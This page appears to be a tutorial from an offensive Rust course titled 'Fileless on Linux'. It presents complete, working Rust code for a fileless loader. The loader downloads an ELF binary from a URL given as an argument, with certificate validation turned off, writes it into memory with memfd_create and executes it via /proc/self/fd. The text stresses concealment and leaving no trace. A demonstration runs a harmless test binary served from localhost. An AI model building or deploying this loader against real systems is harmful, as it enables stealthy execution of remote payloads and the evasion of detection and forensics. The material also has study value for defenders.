+++
title = "Fileless on Linux"
weight = 5
+++

In this section, we'll look at a Linux escape method that allows you to execute a file on the system using only process memory.

This method uses the `memfd_create` function available in libc to create a file in memory. We'll then write an ELF file to this file, which we'll retrieve, in the following example, from an HTTP server.

To use the `memfd_create` function, we'll use the crate **libc** and to make HTTP requests we'll use the **reqwest** library with the blocking feature, which allows us to access blocking functions (**reqwest** uses asynchronous functions by default):

```bash
>>> cargo add libc
>>> cargo add reqwest --features=blocking
```

Here are our dependencies in our Cargo.toml file:
```toml
[dependencies]
libc = "0.2.151"
reqwest = { version = "0.11.23", features = ["blocking"] }
```

Here's our program:
```rust
use std::ffi::CString;
use libc::{memfd_create, write, execve, c_void, c_char, MFD_CLOEXEC};

fn main() {
    let args: Vec<string> = std::env::args().collect();
    if args.len() != 2 {
        eprintln!("Usage: {} <ELF URL>", args.get(0).unwrap());
        return 
    }

    // Retrieves the ELF file
    let url = args.get(1).unwrap();
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    let content = client.get(url).send().expect("Could not get ELF from server").bytes().unwrap();

    // Create the memfd
    let file_name_tmp = CString::new("a.out").unwrap();
    let file_name = file_name_tmp.as_ptr();

    let fd = unsafe { memfd_create(file_name, MFD_CLOEXEC) };
    if fd == -1 {
        eprintln!("Could not create memfd");
        return
    }

    // writes ELF contents to memfd file
    let written = unsafe {
        write(fd, content.to_vec().as_ptr() as *const c_void, content.len())
    };

    if written == 0 {
        eprintln!("Could not write to file descriptor");
    }

    let elf_path = CString::new(format!("/proc/self/fd/{}", fd)).unwrap();

    unsafe {
        execve(elf_path.as_ptr() as *const c_char, std::ptr::null(), std::ptr::null());
    }
}
```

It first retrieves the ELF file from the HTTP server using the `reqwest` library, the URL in this example being specified as an argument.
We're using a blocking HTTP client here, as we want to know what's in the file (and whether we can get it) before proceeding with any other action.

It then calls the `memfd_create` function and populates the file it returns with the ELF file.
It's important to note that calling `memfd_create` requires 2 parameters:

1. the file name, this parameter is only useful for debugging purposes; here, we'll simply set it to "a.out".
2. flags, which can be similar to those available with the open call, here we only use `MFD_CLOEXEC`, which indicates that the file returned by `memfd_create` will be closed when an `exec` is called (`execve`, for example).

Once the ELF file has been written to memory, we'll execute it using execve, the file being available in the special `/proc` folder, which allows access to the `memfd_create` file as if it were on disk.
For the sake of concealment, we don't specify any of the other parameters, which means we won't be visible in the process list. As the current process will be overwritten by `execve`, there will be no trace of this process.

## Demonstration

We'll run the following program (*it-works.c*) to demonstrate that our program works:
```c
#include <stdio.h>
#include <unistd.h>

int main() {
    puts("It works!");
    printf("PID: %d\n", getpid());
    return 0;
}
```

```bash
>>> gcc it-works.c -o it-works
>>> ./it-works 
It works!
PID: 40525
```

This program can be accessed via the URL "http://localhost:8000/it-works".

Here's how it looks when our program is launched and the binary is retrieved:
```bash
>>> cargo run http://localhost:8000/it-works
    Finished dev [unoptimized + debuginfo] target(s) in 0.03s
     Running `target/debug/memfd_exec 'http://localhost:8000/it-works'`
It works!
PID: 40664
```
